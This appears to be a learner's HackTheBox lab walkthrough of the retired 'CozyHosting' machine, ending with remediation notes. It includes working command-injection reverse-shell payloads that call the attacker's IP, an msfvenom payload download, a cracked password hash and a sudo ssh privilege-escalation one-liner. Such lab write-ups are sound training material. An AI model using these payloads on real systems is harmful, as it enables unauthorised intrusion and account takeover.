# Summary

Another Linux webserver hosting a simple web app on port 80. 

I am new to playing HTB. This is a "retired" machine with guided mode and walkthroughs available. I played this box in "Adventure Mode" meaning I took no hints and I did not look at any walkthroughs or guides. 

If you are reading this, thank you! I am mostly writing this for myself as a way to capture my actions and lessons-learned. I plan to do a section at the end of these where I review the mistakes that led to me successfully exploiting the target.

This is a Ubuntu box hosting a Spring Boot web application on port 80. Nmap scan reveals that port 22 for SSH and port 80 for http are open. Looking at the web page, you find a login page as the only accessible link. Poking around the site some more will reveal clues about the web engine - it turns out this is a Spring Boot application. Googling around about that you can find information about the /actuators routes. These show current application state and relevant metrics. Enumerating one of those routes reveals session tokens. You can use those to impersonate an admin user and access the admin console. A feature for SSHing into other servers (all disabled for purposes of the game) is vulnerable to command injection. It is possible to leverage this to gain shell as the web server user.

As the webserver user you can pull the the Java Archive (jar) file of the web application. Reversing that reveals database credentials. Also as the webserver user you can see that there is a user named "josh" on the box. Accessing the postgres database you can find password hashes. Crack these and you find the josh user's password. That reveals the user.txt. 

Checking the josh users sudo privileges reveals he can run ssh as the root user. A quick 1-liner from GTFO bins elevates you to root and the root.txt flag.
# Actions

Like all good stories this one starts out with a privileged Nmap scan:

```
sudo namp -sC -sV 10.10.11.230 -oN cozyhosting.nmap
```
![[Pasted image 20250612112033.png]]

Port 22 for SSH and port 80 for http. HTTP is the larger attack surface so I attack there first.

Looks like the site prefers the domain name "cozyhosting.htb" so I will just add that to my /etc/hosts
```
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

I check for the tech stack. I like whatweb and Wappalyzer.
```
whatweb http://cozyhosting.htb
```
![[Pasted image 20250612112837.png]]

![[Pasted image 20250612112855.png]]

Nginx hosting a bootstrap application. To be honest not much information to go off of.

Clicking around the site, the only thing that I can input into is the login page - I will open it up in Burp

standard login:

![[Pasted image 20250612113152.png]]

login with remember me checked:

![[Pasted image 20250612113223.png]]

I'll pass that one into repeater. 

Reviewing the page sources with CTRL+U I find that there is a comment in the code:

```html
<!-- =======================================================
* Template Name: NiceAdmin|
* Updated: Mar 09 2023 with Bootstrap v5.2.3|
* Template URL: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/|
* Author: BootstrapMade.com|
* License: https://bootstrapmade.com/license/|
======================================================== -->
```
Googling around, I find this code:

https://github.com/fiqrv/ventory/blob/main/login.php

It looks like this is a template you can buy - this guy had the template and added some PHP code before deploying. Maybe HTB is using the same thing?

If they are then that code looks H I G H L Y injectable so I fire up sqlmap.

```php
<?php
session_start(); // Start the session

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    include 'php_action/connect.php';
    $email = $_POST['email'];
    $password = $_POST['password'];

    $sql = "SELECT id FROM staff WHERE email = ? AND password = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param('ss', $email, $password);
    $stmt->execute();
    $stmt->store_result();

    if ($stmt->num_rows > 0) {
        // user exists, authenticate
        $stmt->bind_result($id);
        $stmt->fetch();

        // set session variables
        $_SESSION['id'] = $id;
        $_SESSION['email'] = $email;
        echo $_SESSION['id'];
        // redirect to index.php
        header('Location: index.php');
        exit();
    } else {
        // authentication failed, display error message
        $error = "Invalid email or password.";
    }

    $stmt->close();
    $conn->close();
}
?>
```
Replace the parameters with a /* then run 
```
sqlmap -r file
```
I let that run for awhile and I found.... nothing. I expanded the risk and level variables and still nothing.

So no SQL injection here.

I move on to VHOST and directory fuzzing with FFuf.

```
ffuf -u http://cozyhosting.htb -H "Host: FUZZ.cozyhosting.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

![[Pasted image 20250612130119.png]]

I also enumerate for subdirectories. 

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://cozyhosting.htb/FUZZ -recursion -recursion-depth 1 -ic
```

![[Pasted image 20250612134814.png]]

Clicking around the webpage I eventually stumbled on an error page.

![[Pasted image 20250612130353.png]]

I have never seen an error page like this before so I google it. It turns out this is the standard error page for Spring Boot - a Java framework.

I really hate the Google searches that are essentially "how to hack X" but I do it anyway:

Googling for  "Spring Boot vulnerabilities" I came upon this "actuator" concept
https://www.wiz.io/blog/spring-boot-actuator-misconfigurations

Checking for myself:

![[Pasted image 20250612140327.png]]

This site is misconfigured to expose the actuators running through it makes it more clear what is exposed.

![[Pasted image 20250612140443.png]]

looks like I'll have to test these out and do some reading

I find what I believe to be the session tokens:

![[Pasted image 20250612192425.png]]

Then I do an incorrect login and curl against the endpoint again:

![[Pasted image 20250612193015.png]]

So it is definitely a session token - I can use this to impersonate the kanderson user.

To do that open the dev tools console in your browser. Check the Application > Storage tab and change the value for the session ID.

![[Pasted image 20250612193056.png]]

Then I try navigating to the /admin route I found with ffuf.

![[Pasted image 20250612193115.png]]

I'm in!

Under mappings I also found an interesting endpoint called /executessh

![[Pasted image 20250612193921.png]]

So maybe in this admin panel there is a place to perform command injection.

At the bottom of the page is some kind of UI for managing the host connections.

![[Pasted image 20250612201240.png]]

I test a few combinations and find that it is trying to open an SSH connection using the webserver - command injection attack enters stage left.

An SSH command looks like this:
```
ssh username@hostname 
```

I spent a long time trying to a command to run after hostname - my thinking that the SSH command finishes then something else could run on the same line

Testing revealed they had very very good filters over that parameter.

It eventually occurred to me to try the other parameter:

![[Pasted image 20250612201620.png]]

so we are the user app

I have to figure out how to abuse this

it seems to be only returning the first line:
![[Pasted image 20250612202128.png]]

When I try the other parameter I start getting error messages back - this is a good sign it means I can try to inject a reverse shell here.
```
kanderson$(bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.22/1337${IFS}0>&1)
```
It gets stuck on the &

I realize that the target has netcat so I try a few injections targeting that binary.
```
kanderson$(nc${IFS}-e${IFS}/bin/sh${IFS}10.10.14.22${IFS}1337)
```
```
kanderson$(nc${IFS}-lvnp${IFS}1337)
```
No dice on a bind shell with nc. I switch to a reverse shell:

```
echo 'bash -i >/dev/tcp/10.10.14.22/1337 0<&1 2>&1' | base64
```
```
kanderson;$(echo${IFS}YmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjIvMTMzNyAwPCYxIDI+JjEK|base64${IFS}-d|bash)
```
I learned in the video walkthrough after completing the box that the Ippsec got this to work by removing the +. The + and & will break in the http request. You can add an extra space anywhere you have a space or URL encode the base64 in the repeater request to bypass.

My dumbass on the other hand do some furious googling and arrive at a reverse shell that does not make use of the & operator:
```
kanderson$(mkfifo${IFS}/tmp/x;nc${IFS}10.10.14.22${IFS}1337</tmp/x|bash${IFS}>/tmp/x)
```

![[Pasted image 20250612212500.png]]

And I am in!.... a jail shell.

To re-establish connection I copy/pasted the command from burp:
```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: cozyhosting.htb' -H $'Content-Length: 111' -H $'Cache-Control: max-age=0' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: http://cozyhosting.htb' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://cozyhosting.htb/admin?error=Host%20key%20verification%20failed.' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    -b $'JSESSIONID=ACBABA8CFE7F5E22F92462BF4B675BC0' \
    --data-binary $'host=127.0.0.1&username=kanderson$(mkfifo${IFS}/tmp/x;nc${IFS}10.10.14.22${IFS}1337</tmp/x|bash${IFS}>/tmp/x)\x0d\x0a' \
    $'http://cozyhosting.htb/executessh'
```
You can use this request to grab the session token:
```
curl http://cozyhosting.htb/actuator/sessions | jq .
```

Poking around a little I find that you can curl and wget into the /tmp folder this is important to me because I need to build another reverse shell - one that allows for redirection.

![[Pasted image 20250612213848.png]]

I craft a shell from msfvenom and run that back for better persistence and a more stable shell

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=31337 -f elf -o oops
```
```
curl http://10.10.14.22:8000/oops -o oops
```
```
sudo nc -lvnp 31337
```
Then I execute oops in my jail shell and I get another callback that I can stabilize:
```
/bin/bash -i
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")' 
```
Now that I have that sorted I see that the /app folder has the web application jar in it.

Not sure if I need it but I grab the jar at /app/cloudhosting-0.0.1.jar - I run an http.server on python and curl it from my attack host.

I don't have an application for reversing .jar files. I learn from the walkthroughs after completing that box that you can just unzip the .jar with the unzip or 7z tool. I google around and settle on the jd-gui package - which provides... a nice GUI.

jd-gui is very easy to use. I poked around in the .class files until I located an "application.properties".

![[Pasted image 20250613143544.png]]

This reveals the creds for the postgres user.

I kept enumerating the jar and I also found the handler code for that /executessh route.

![[Pasted image 20250613143707.png]]

Moving back to the creds, I see from /etc/passwd, the postgres user has a shell.

![[Pasted image 20250613143836.png]]

But a su command to the postgres user fails. 

So now I have to access the postgres console. I have never worked in postgres so I rely heavily on Google for a how-to.

The internet says to use a program called "psql" like this:
https://neon.com/postgresql/postgresql-cheat-sheet
```
psql -d cozyhosting -h localhost -p 5432 -U postgres
```

![[Pasted image 20250613144334.png]]

I enumerate the database and find the user table.

![[Pasted image 20250613144935.png]]

I have seen that hash prefix before - those are blowfish hashes. Which are nearly impossible to crack,

I flip back to enumerating the .jar. I eventually find the password of the kanderson user. I try that against the josh user. Nothing. It is also a complex string so I become more convinced that the admin user hash will also be complex and hard to crack.

I pull in linenum.sh and run that as the app user. I google around and try to find postgres vulnerabilities that will let me read or write files. If I could read files, I would try to grab the Josh user's ssh key and ssh in as him. If I could write files I would write a reverse shell and hop in as the postgres user and try enumerating from there.

![[Pasted image 20250613155430.png]]

```
SELECT pg_read_file('/home/josh/.ssh/id_rsa', 0, 1000);
```
![[Pasted image 20250613155638.png]]

```
COPY (SELECT 'test') TO '/var/lib/postgresql/.ssh/id_rsa';
```

It turned out that neither of those were an option.

With few options left, the taking a hint is knocking at my door. I review everything I have enumerated. I decided that the only thing I had not tried was cracking the admin user string so I get set up to let that run for a long time:
```
hashcat -d 3 -m 3200 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250616085237.png]]

Aaaaand it is cracked in about 5 seconds.


![[Pasted image 20250616085821.png]]

It turns out that password is good for the josh user, I SSH in and grab the user.txt flag.

When you become a new user, you should always check your sudo privileges first thing:

![[Pasted image 20250616090431.png]]

Then check GTFO bins.

GTFO bins said to use this 1-liner:
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![[Pasted image 20250616091041.png]]

I am groot

![[Pasted image 20250616091125.png]]

# Remediation

The main weaknesses of this information system:
- exposed /actuator endpoints
- allowing the webserver user to have a shell
- password re-use for the josh/admin user
- unnecessary sudo permissions on the ssh binary for the josh user

I think the most critical vulnerability was the unsecured /actuator endpoints. If that had been closed, the box would have been virtually unhackable.

I learned from Ippsec that you can not expose the sessions endpoints by setting a key:value in the app.properties file:
```
management.endpoints.sessions = false
```
These could also be protected with a WAF.

# Lessons from Walkthroughs

After completing a box I will start to read a walkthrough and watch the corresponding Ippsec video. I think this will complete my OSCP practice workflow: Pick a box > hack the box in adventure mode > review other walkthroughs > write a write-up of what I did. Because now I am struggling on my own, recapping my actions, and reviewing the actions of others to learn better TTPs.

## 0xdf

For the reverse shell he used curl to upload a reverse shell script to /tmp then made another call to execute.

## Ippsec

Identifies that the token is a JSESSIONID - indicative of a Java web engine

uses brace expansion:

```
;{sleep,1};
```

for the reverse shell he did base64 encoding and decoding
- for the script he removed the + character from the encoding by adding an extra space - the + will break the http request
- or you can url encode the base64

```
;{echo,-n,<base64>}|{base64,-d}|bash;
```

this shell was nice and stable

you disable the actuators in the app.properties by changing management.sessions to false

![[Pasted image 20250617092527.png]]

